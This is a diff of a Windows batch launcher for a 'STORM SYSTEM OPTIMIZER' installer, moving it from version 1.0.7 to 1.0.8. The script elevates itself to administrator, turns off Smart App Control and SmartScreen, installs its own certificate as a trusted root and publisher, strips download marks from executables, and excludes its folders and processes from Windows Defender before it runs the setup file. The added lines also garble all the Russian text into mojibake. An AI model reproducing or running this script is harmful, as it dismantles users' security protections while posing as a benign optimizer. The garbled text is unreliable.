@@ -1,19 +1,19 @@
-@echo off
+п»ї@echo off
 chcp 65001 >nul
-title STORM SYSTEM OPTIMIZER - Разблокировка Smart App Control и Доверие Сертификата
+title STORM SYSTEM OPTIMIZER - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Smart App Control пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 :: ============================================================
-:: 1. Проверка и автоматический запрос прав Администратора
+:: 1. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 :: ============================================================
 net session >nul 2>&1
 if %errorLevel% neq 0 (
-    echo [i] Запрос прав администратора для снятия блокировки Smart App Control...
+    echo [i] пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Smart App Control...
     powershell.exe -NoProfile -Command "Start-Process '%~f0' -Verb RunAs"
     exit /b
 )
 
 echo ============================================================
-echo   STORM SYSTEM OPTIMIZER v1.0.7 - СНЯТИЕ ВСЕХ БЛОКИРОВОК
+echo   STORM SYSTEM OPTIMIZER v1.0.8 - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 echo   (Smart App Control, SmartScreen, Mark-of-the-Web, Defender)
 echo ============================================================
 echo.
@@ -35,65 +35,65 @@ if not exist "%CERT_FILE%" (
 )
 
 :: ============================================================
-:: 2. Отключение блокировок Smart App Control и SmartScreen
+:: 2. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Smart App Control пїЅ SmartScreen
 :: ============================================================
-echo [1/5] Снятие блокировки Интеллектуального управления приложениями (Smart App Control)...
+echo [1/5] пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (Smart App Control)...
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy" /v "VerifiedAndReputablePolicyState" /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy" /v "SAC_PreviousState" /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "SmartScreenEnabled" /t REG_SZ /d "Off" /f >nul 2>&1
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\AppHost" /v "EnableWebContentEvaluation" /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "EnableSmartScreen" /t REG_DWORD /d 0 /f >nul 2>&1
-echo [OK] Блокировка Smart App Control успешно нейтрализована!
+echo [OK] пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Smart App Control пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ!
 
 :: ============================================================
-:: 3. Установка цифрового сертификата STORM TEAM во все хранилища
+:: 3. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ STORM TEAM пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 :: ============================================================
 echo.
 if exist "%CERT_FILE%" (
-    echo [2/5] Регистрация доверия цифрового сертификата STORM TEAM...
+    echo [2/5] пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ STORM TEAM...
     certutil.exe -addstore -f "Root" "%CERT_FILE%" >nul 2>&1
     certutil.exe -addstore -f "TrustedPublisher" "%CERT_FILE%" >nul 2>&1
     certutil.exe -addstore -f "AuthRoot" "%CERT_FILE%" >nul 2>&1
     certutil.exe -user -addstore -f "Root" "%CERT_FILE%" >nul 2>&1
     certutil.exe -user -addstore -f "TrustedPublisher" "%CERT_FILE%" >nul 2>&1
-    echo [OK] Сертификат STORM TEAM успешно добавлен в Доверенные корневые центры и Издатели!
+    echo [OK] пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ STORM TEAM пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ!
 ) else (
-    echo [!] Файл сертификата не найден: %CERT_FILE%
+    echo [!] пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ: %CERT_FILE%
 )
 
 :: ============================================================
-:: 4. Снятие интернет-метки блокировки (Mark-of-the-Web)
+:: 4. пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ-пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (Mark-of-the-Web)
 :: ============================================================
 echo.
-echo [3/5] Снятие интернет-меток блокировки (Unblock Mark-of-the-Web)...
+echo [3/5] пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ-пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (Unblock Mark-of-the-Web)...
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem -Path '%SCRIPT_DIR%' -Recurse -Include *.exe,*.dll,*.cer,*.bat,*.cmd,*.ps1 | ForEach-Object { Unblock-File -Path $_.FullName -ErrorAction SilentlyContinue }" >nul 2>&1
-echo [OK] Все файлы и библиотеки успешно разблокированы!
+echo [OK] пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ!
 
 :: ============================================================
-:: 5. Добавление папки программы в исключения Windows Defender
+:: 5. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Windows Defender
 :: ============================================================
 echo.
-echo [4/5] Добавление папки приложения в доверенную зону Защитника...
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%SCRIPT_DIR%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath 'C:\Program Files\StormSystemOptimizer' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'StormSystemOptimizer.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'STORM_SYSTEM_OPTIMIZER_1.0.7_Setup.exe' -ErrorAction SilentlyContinue" >nul 2>&1
-echo [OK] Исключения и защита от блокировок добавлены!
+echo [4/5] пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ...
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%SCRIPT_DIR%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath 'C:\Program Files\StormSystemOptimizer' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'StormSystemOptimizer.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'STORM_SYSTEM_OPTIMIZER_1.0.8_Setup.exe' -ErrorAction SilentlyContinue" >nul 2>&1
+echo [OK] пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ!
 
 :: ============================================================
-:: 6. Запуск приложения / установщика
+:: 6. пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ / пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 :: ============================================================
 echo.
-echo [5/5] Запуск STORM SYSTEM OPTIMIZER v1.0.7...
+echo [5/5] пїЅпїЅпїЅпїЅпїЅпїЅ STORM SYSTEM OPTIMIZER v1.0.8...
 echo.
 echo ============================================================
-echo   ГОТОВО! Все блокировки системы сняты.
+echo   пїЅпїЅпїЅпїЅпїЅпїЅ! пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 echo ============================================================
 echo.
 
-if exist "%SCRIPT_DIR%Files\STORM_SYSTEM_OPTIMIZER_1.0.7_Setup.exe" (
-    start "" "%SCRIPT_DIR%Files\STORM_SYSTEM_OPTIMIZER_1.0.7_Setup.exe"
+if exist "%SCRIPT_DIR%Files\STORM_SYSTEM_OPTIMIZER_1.0.8_Setup.exe" (
+    start "" "%SCRIPT_DIR%Files\STORM_SYSTEM_OPTIMIZER_1.0.8_Setup.exe"
 ) else if exist "%SCRIPT_DIR%Assembling\StormSystemOptimizer.exe" (
     start "" "%SCRIPT_DIR%Assembling\StormSystemOptimizer.exe"
-) else if exist "%SCRIPT_DIR%STORM_SYSTEM_OPTIMIZER_1.0.7_Setup.exe" (
-    start "" "%SCRIPT_DIR%STORM_SYSTEM_OPTIMIZER_1.0.7_Setup.exe"
+) else if exist "%SCRIPT_DIR%STORM_SYSTEM_OPTIMIZER_1.0.8_Setup.exe" (
+    start "" "%SCRIPT_DIR%STORM_SYSTEM_OPTIMIZER_1.0.8_Setup.exe"
 )
 
 timeout /t 3 >nul
